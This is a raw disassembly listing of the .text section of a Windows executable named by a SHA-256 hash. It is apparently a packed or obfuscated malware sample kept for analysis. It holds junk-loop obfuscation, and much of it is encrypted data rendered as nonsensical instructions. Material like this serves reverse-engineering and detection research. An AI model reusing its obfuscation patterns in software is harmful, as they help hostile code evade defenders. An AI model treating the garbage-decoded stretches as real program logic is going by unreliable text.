
dad7c0373953f5abfe466479d9af7acd8a46f88fecbeb8c1de715d7a965c10f2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ecx+0x7ec55331],al
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [edi],bh
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x476cb739
  40126d:	retf   
  40126e:	shl    dl,cl
  401270:	or     al,0xaa
  401272:	punpcklbw mm2,DWORD PTR [ecx+ebp*1+0x61fe4032]
  40127a:	and    ebx,esp
  40127c:	pop    ebx
  40127d:	jo     0x4012a6
  40127f:	push   ebx
  401280:	popa   
  401281:	xchg   DWORD PTR [ecx],ecx
  401283:	sub    ah,dl
  401285:	popf   
  401286:	push   ecx
  401287:	pop    DWORD PTR [ebx+0x3f]
  40128a:	pushf  
  40128b:	xchg   esp,eax
  40128c:	aaa    
  40128d:	jb     0x401259
  40128f:	arpl   sp,bp
  401291:	fbld   TBYTE PTR [ecx+0x10]
  401294:	out    0xa7,eax
  401296:	sbb    eax,edx
  401298:	dec    edx
  401299:	cmp    eax,0x102f248b
  40129e:	sub    DWORD PTR [ecx+0x45],ebx
  4012a1:	jb     0x40130f
  4012a3:	sahf   
  4012a4:	stos   DWORD PTR es:[edi],eax
  4012a5:	rol    BYTE PTR [ebx-0x4f],cl
  4012a8:	or     eax,0x76053487
  4012ad:	pop    eax
  4012ae:	mov    ch,0xe3
  4012b0:	jns    0x401234
  4012b2:	add    BYTE PTR [ecx+0x43],0xc
  4012b6:	or     DWORD PTR [edi+0x688a8222],ebp
  4012bc:	addr16 call 0x47e3157d
  4012c2:	jns    0x401255
  4012c4:	in     al,dx
  4012c5:	retf   
  4012c6:	and    dl,BYTE PTR [eax+ecx*4]
  4012c9:	add    ch,BYTE PTR [eax+ebp*4+0x60]
  4012cd:	xchg   ebp,eax
  4012ce:	in     eax,0xe1
  4012d0:	jbe    0x401296
  4012d2:	sub    edi,DWORD PTR [eax+ecx*1-0xe6951a0]
  4012d9:	out    0xb6,eax
  4012db:	or     DWORD PTR ds:0x562a8f76,0xffffffb7
  4012e2:	(bad)  
  4012e3:	(bad)  
  4012e5:	pop    ecx
  4012e6:	cs cld 
  4012e8:	pop    ecx
  4012e9:	jbe    0x4012a1
  4012eb:	rcr    ah,0xf4
  4012ee:	dec    ebx
  4012ef:	fs push 0xa1250882
  4012f5:	jle    0x401327
  4012f7:	call   DWORD PTR [eax]
  4012f9:	push   ebp
  4012fa:	fdivr  DWORD PTR [eax+0xe]
  4012fd:	jp     0x40128f
  4012ff:	dec    ecx
  401300:	jnp    0x4012bf
  401302:	xor    BYTE PTR [edi],al
  401304:	out    0xd0,eax
  401306:	in     eax,0x3a
  401308:	and    dh,BYTE PTR [edx+edx*8-0x5e616fcb]
  40130f:	cmp    eax,0x605d03f8
  401314:	inc    ebp
  401315:	dec    eax
  401316:	in     eax,0x1c
  401318:	add    al,0x3b
  40131a:	mov    cl,ch
  40131c:	imul   ebp,DWORD PTR [edx+0x6d],0xffffffbd
  401320:	fwait
  401321:	mov    eax,0xe2284e03
  401326:	jp     0x40130b
  401328:	pop    ebp
  401329:	leave  
  40132a:	out    0x15,al
  40132c:	push   ebx
  40132d:	push   0x474cd673
  401332:	cli    
  401333:	pop    es
  401334:	jne    0x401390
  401336:	xor    eax,0x48a9e6f
  40133b:	test   eax,0xaeca7fac
  401340:	inc    edx
  401341:	nop
  401342:	or     al,0x4f
  401344:	fnsave [edi-0x42]
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	xor    al,0x90
  4013b5:	int    0xb1
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x40142d
  4013c0:	inc    ebp
  4013c1:	loope  0x40141c
  4013c3:	jne    0x401387
  4013c5:	ins    BYTE PTR es:[edi],dx
  4013c6:	inc    edi
  4013c7:	mov    cr5,ebx
  4013ca:	lods   eax,DWORD PTR ds:[esi]
  4013cb:	pop    es
  4013cc:	mov    es,WORD PTR [edi+0x2f]
  4013cf:	push   es
  4013d0:	rcr    DWORD PTR [edi+0x58daa4b7],cl
  4013d6:	adc    dl,BYTE PTR [edi-0x7be712e4]
  4013dc:	mov    esp,0xd7bfc31f
  4013e1:	call   0x60cb987c
  4013e6:	inc    ebp
  4013e7:	push   0x6a
  4013e9:	nop
  4013ea:	scas   al,BYTE PTR es:[edi]
  4013eb:	jnp    0x401428
  4013ed:	xlat   BYTE PTR ds:[ebx]
  4013ee:	sbb    ebx,DWORD PTR ds:0x699d22de
  4013f4:	outs   dx,BYTE PTR ds:[esi]
  4013f5:	cwde   
  4013f6:	sbb    al,0x9f
  4013f8:	out    0xdb,eax
  4013fa:	or     al,0x5c
  4013fc:	cdq    
  4013fd:	push   eax
  4013fe:	and    esp,ebp
  401400:	dec    edi
  401401:	pop    edi
  401402:	adc    BYTE PTR [ecx],0x82
  401405:	xor    DWORD PTR [edx+0x4c],edi
  401408:	jl     0x40142e
  40140a:	repz shl edi,0x57
  40140e:	xor    al,0x5
  401410:	xchg   esp,eax
  401411:	sar    DWORD PTR [esi],cl
  401413:	dec    esp
  401414:	scas   al,BYTE PTR es:[edi]
  401415:	fstp   TBYTE PTR [ebx]
  401417:	(bad)
  40141c:	jecxz  0x4013e3
  40141e:	pop    ecx
  40141f:	je     0x401477
  401421:	jge    0x401499
  401423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401424:	imul   ebx,DWORD PTR [edx+0xb],0x2d
  401428:	xor    bl,BYTE PTR [edi]
  40142a:	fsubr  DWORD PTR [edi]
  40142c:	ror    esp,1
  40142e:	not    BYTE PTR [ebp+0x1a]
  401431:	push   ecx
  401432:	dec    eax
  401433:	cli    
  401434:	xor    eax,0xf39a4979
  401439:	repz ret 
  40143b:	dec    ecx
  40143c:	repz adc bh,BYTE PTR [ebp-0x5d75154d]
  401443:	in     al,dx
  401444:	cmp    ebx,DWORD PTR [ebx-0x3762a289]
  40144a:	mul    BYTE PTR [esi-0x12]
  40144d:	sbb    eax,0x9610d3c
  401452:	es jbe 0x4014a9
  401455:	imul   edx,DWORD PTR [edi-0x14],0x166475b9
  40145c:	mov    edi,0x8e017586
  401461:	daa    
  401462:	lea    esi,[edi+0x20]
  401465:	shl    DWORD PTR [edx-0x1d],cl
  401468:	(bad)  
  401469:	fcom   QWORD PTR [edi+0x25]
  40146c:	push   edx
  40146d:	in     eax,dx
  40146e:	xor    al,0xa1
  401470:	pop    ebp
  401471:	xor    BYTE PTR [edi],al
  401473:	jb     0x401460
  401475:	dec    BYTE PTR [ecx+0x3c9a11bd]
  40147b:	cs push esp
  40147d:	mov    ds:0x854e7b83,eax
  401482:	mov    al,ds:0x2cb0a30f
  401487:	push   eax
  401488:	mov    dl,0x54
  40148a:	mov    edi,0xcec0cbe8
  40148f:	scas   eax,DWORD PTR es:[edi]
  401490:	adc    ecx,DWORD PTR [eax+0x78fc316f]
  401496:	xor    cl,BYTE PTR [esi+esi*2+0x2f7a6c5a]
  40149d:	into   
  40149e:	push   cs
  40149f:	pop    ebx
  4014a0:	or     ecx,esi
  4014a2:	div    BYTE PTR [ecx+0x3e]
  4014a5:	push   eax
  4014a6:	sbb    al,0xad
  4014a8:	mov    bh,BYTE PTR [ecx+0x4]
  4014ab:	mov    esp,0x19e0f985
  4014b0:	push   edi
  4014b1:	inc    edx
  4014b2:	sti    
  4014b3:	ret    0xdfc4
  4014b6:	ds jo  0x4014b8
  4014b9:	in     eax,dx
  4014ba:	int    0xec
  4014bc:	sti    
  4014bd:	sbb    DWORD PTR [edx+0x1f],esi
  4014c0:	pop    edi
  4014c1:	inc    ebp
  4014c2:	int    0xae
  4014c4:	(bad)  [esi+0x69]
  4014c7:	cld    
  4014c8:	add    bh,BYTE PTR [eax-0x5cb53ee6]
  4014ce:	mov    WORD PTR [edx+0x579d1e53],0x5b50
  4014d7:	adc    al,0xaf
  4014d9:	iret   
  4014da:	aam    0x82
  4014dc:	mov    ?,WORD PTR [edi]
  4014de:	sub    dh,BYTE PTR [esi-0x170013ae]
  4014e4:	(bad)  
  4014e5:	sti    
  4014e6:	test   BYTE PTR [edx+edx*8+0x200e2762],0xac
  4014ee:	add    al,0xee
  4014f0:	push   0x3f5561a8
  4014f5:	into   
  4014f6:	pop    ebx
  4014f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014f8:	inc    edi
  4014f9:	int    0xfa
  4014fb:	adc    BYTE PTR ds:0xa2e8c4e9,bl
  401501:	mov    ch,0x9b
  401503:	inc    ebp
  401504:	cmp    DWORD PTR [ecx+0x63],0x71a62e5f
  40150b:	out    dx,eax
  40150c:	lock jbe 0x40154e
  40150f:	cli    
  401510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401511:	jns    0x401588
  401513:	mov    ss:0x449bf6b7,al
  401519:	cmp    dh,0x5a
  40151c:	mov    DWORD PTR [ebx+esi*1],edx
  40151f:	cwde   
  401520:	mov    ah,0x28
  401522:	aaa    
  401523:	pop    esp
  401524:	fisttp QWORD PTR [edx+edx*8+0x5b9cf404]
  40152b:	arpl   WORD PTR [ecx+0x6c],sp
  40152e:	(bad)  [ebx]
  401530:	adc    DWORD PTR [eax],0x5f
  401533:	mov    eax,ds:0x4c5f28e2
  401538:	and    BYTE PTR [ebx+0x13367170],0x83
  40153f:	inc    esi
  401540:	sbb    ah,BYTE PTR [edx-0x3bba74d8]
  401546:	xor    DWORD PTR ds:0x43360f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x20acdce3]
  401564:	jne    0x40156c
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401538
  40156e:	into   
  40156f:	shr    BYTE PTR fs:[edi],cl
  401572:	ins    DWORD PTR es:[edi],dx
  401573:	xchg   ebp,eax
  401574:	stc    
  401575:	out    dx,eax
  401576:	(bad)  
  401577:	imul   esi,ebp,0xffffffbf
  40157a:	and    BYTE PTR [ebx+0x5dedb6ea],0x8d
  401581:	mov    WORD PTR [ebp+0x595911a5],es
  401587:	(bad)  
  401588:	shl    DWORD PTR [edx+0x3],cl
  40158b:	(bad)  
  40158c:	call   0xdd2a2294
  401591:	nop
  401592:	pop    edi
  401593:	mov    ebx,0xf6f9624b
  401598:	mov    dh,0xb8
  40159a:	cmp    eax,0xd9e7690a
  40159f:	int    0xf2
  4015a1:	add    al,0x7
  4015a3:	into   
  4015a4:	and    dh,dl
  4015a6:	ret    0xc44c
  4015a9:	add    DWORD PTR [edi],esi
  4015ab:	test   DWORD PTR [edi-0x32eb15af],edi
  4015b1:	fdiv   QWORD PTR [edi+0x10]
  4015b4:	bound  ebx,QWORD PTR [ecx]
  4015b6:	push   0x97f9f691
  4015bb:	jnp    0x401615
  4015bd:	cmc    
  4015be:	shl    BYTE PTR [eax-0x1d6dcfd5],cl
  4015c4:	(bad)  
  4015c5:	lea    edx,[esi-0x7b]
  4015c8:	ja     0x40163f
  4015ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015cb:	fidiv  WORD PTR [edi+0x59b7cfe2]
  4015d1:	cmovs  eax,DWORD PTR [ecx-0x15a32b45]
  4015d8:	into   
  4015d9:	jnp    0x401574
  4015db:	or     BYTE PTR [esi+0x635bba0c],ah
  4015e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e2:	cmp    DWORD PTR [edx+0xcdd5b80],ebx
  4015e8:	cmc    
  4015e9:	cmp    BYTE PTR [ebx],bl
  4015eb:	jae    0x401640
  4015ed:	fidiv  WORD PTR [edi]
  4015ef:	leave  
  4015f0:	pop    es
  4015f1:	xor    bl,ah
  4015f3:	idiv   BYTE PTR [edi+ebp*1]
  4015f6:	shl    bl,0xa
  4015f9:	icebp  
  4015fa:	rcr    BYTE PTR [edi+0x49],0xbb
  4015fe:	xchg   BYTE PTR [esp+eiz*4+0x29],dh
  401602:	pushf  
  401603:	fstp   QWORD PTR [edi+0x6b]
  401606:	pop    ds
  401607:	and    esp,esp
  401609:	arpl   WORD PTR [ecx],cx
  40160b:	popa   
  40160c:	sub    edi,eax
  40160e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40160f:	mov    ebp,0xa89b9919
  401614:	adc    DWORD PTR [eax-0x3d574700],ebp
  40161a:	add    eax,DWORD PTR [edi+0x6de0d38c]
  401620:	xor    al,0x72
  401622:	pop    ds
  401623:	xor    DWORD PTR [ebx+0x4d],esi
  401626:	jg     0x401655
  401628:	push   eax
  401629:	les    edi,FWORD PTR [edi]
  40162b:	sub    eax,0x58ffb606
  401630:	iret   
  401631:	push   ecx
  401632:	int3   
  401633:	in     al,0x33
  401635:	jns    0x40167c
  401637:	pop    ebx
  401638:	mov    dl,0x85
  40163a:	jge    0x4015bc
  40163c:	fdiv   st,st(4)
  40163e:	mov    ebp,es
  401640:	outs   dx,DWORD PTR ds:[esi]
  401641:	fidiv  WORD PTR [edx+0x75]
  401644:	loope  0x4015cb
  401646:	shl    ah,0x14
  401649:	jl     0x4016ae
  40164b:	fdivr  QWORD PTR [ebp-0x5188dc26]
  401651:	push   eax
  401652:	fs enter 0x3910,0x9c
  401657:	data16 jns 0x401650
  40165a:	mov    ebp,0xca8e755c
  40165f:	add    dh,BYTE PTR [eax]
  401661:	sub    DWORD PTR [edx],edi
  401663:	repz xchg edi,eax
  401665:	sub    ah,BYTE PTR [ebx]
  401667:	ins    BYTE PTR es:[edi],dx
  401668:	and    bl,BYTE PTR [ebp+0x77]
  40166b:	call   0x5388:0xd5c9bb3a
  401672:	mov    esp,0x6264589a
  401677:	and    edi,DWORD PTR [edi+0x5d943c34]
  40167d:	in     al,0xd1
  40167f:	loop   0x401655
  401681:	test   al,0xcf
  401683:	push   edi
  401684:	call   0x5fe3:0xdff2e699
  40168b:	dec    eax
  40168c:	loop   0x4016ba
  40168e:	test   eax,0x71b7cd80
  401693:	data16 gs loop 0x401625
  401697:	sbb    al,0x33
  401699:	lahf   
  40169a:	pop    edi
  40169b:	js     0x4016d2
  40169d:	jmp    0x4016f7
  40169f:	neg    BYTE PTR [edx+0x3ff1c5dc]
  4016a5:	jnp    0x401716
  4016a7:	shl    esp,cl
  4016a9:	mov    DWORD PTR [edi-0x3d],edx
  4016ac:	jp     0x4016c1
  4016ae:	adc    al,0x4d
  4016b0:	sub    ebp,DWORD PTR [ebx+0x42292120]
  4016b6:	(bad)  
  4016b7:	rcl    dh,1
  4016b9:	xchg   ecx,eax
  4016ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016bb:	test   eax,0xbafee7de
  4016c0:	or     eax,0x13827336
  4016c5:	mov    bl,0xcc
  4016c7:	mov    dl,0x4c
  4016c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ca:	in     eax,dx
  4016cb:	dec    ebp
  4016cc:	pop    ecx
  4016cd:	dec    esi
  4016ce:	mov    esi,0x8e8bcd1c
  4016d3:	loope  0x40169d
  4016d5:	inc    ebx
  4016d6:	and    al,0x55
  4016d8:	aaa    
  4016d9:	xor    DWORD PTR [ebx+eiz*8-0x4c],0xffffff93
  4016de:	push   cs
  4016df:	rcl    ch,0x3a
  4016e2:	sub    al,0xd6
  4016e4:	repnz push 0xffffffa8
  4016e7:	imul   ecx,DWORD PTR [ebx-0x80],0x35571c09
  4016ee:	idiv   BYTE PTR [esi]
  4016f0:	int    0x3
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x52266ade
  4018e9:	add    ecx,DWORD PTR [ebx]
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x40196c
  4018f4:	adc    esp,DWORD PTR [ebx+0x7b1179c8]
  4018fa:	mov    dh,0x2a
  4018fc:	pushf  
  4018fd:	jno    0x40196b
  4018ff:	pop    edi
  401900:	test   eax,0x7fab5dc2
  401905:	dec    ebp
  401906:	fldenv [ebp-0x5c3ad381]
  40190c:	aas    
  40190d:	add    edi,0x7526838d
  401913:	push   0xffffff96
  401915:	std    
  401916:	sbb    al,0x7
  401918:	pop    ss
  401919:	sbb    ah,BYTE PTR [eax]
  40191b:	inc    ebx
  40191c:	lods   al,BYTE PTR ds:[esi]
  40191d:	arpl   WORD PTR [edi+0x38],bx
  401920:	scas   eax,DWORD PTR es:[edi]
  401921:	cmp    cl,dh
  401923:	dec    ecx
  401924:	stos   BYTE PTR es:[edi],al
  401925:	daa    
  401926:	in     eax,dx
  401927:	in     eax,dx
  401928:	push   eax
  401929:	add    DWORD PTR [edx-0x3a136e0b],edx
  40192f:	lods   al,BYTE PTR ds:[esi]
  401930:	xor    BYTE PTR [ebx],al
  401932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401933:	fidivr WORD PTR [edx]
  401935:	jmp    0x93da4633
  40193a:	popf   
  40193b:	push   ecx
  40193c:	pop    ds
  40193d:	daa    
  40193e:	push   es
  40193f:	jp     0x4019a8
  401941:	push   edi
  401942:	mov    ch,0x43
  401944:	fcom   DWORD PTR [edx+esi*8]
  401947:	outs   dx,DWORD PTR ds:[esi]
  401948:	dec    ebx
  401949:	fistp  QWORD PTR [edi]
  40194b:	mov    eax,0xf921c3c8
  401950:	fadd   QWORD PTR [ecx+0x44]
  401953:	in     al,0xea
  401955:	mov    dl,bh
  401957:	mov    ecx,0xec07f0fb
  40195c:	mov    al,ds:0x171662a8
  401961:	sar    BYTE PTR [edi+0x5b],0xb1
  401965:	bnd js 0x40192f
  401968:	shl    BYTE PTR [ebp-0x78],0xf1
  40196c:	sub    BYTE PTR [eax+edx*8+0x6d43298f],0x42
  401974:	xlat   BYTE PTR ds:[ebx]
  401975:	scas   eax,DWORD PTR es:[edi]
  401976:	outs   dx,DWORD PTR ds:[esi]
  401977:	int3   
  401978:	aas    
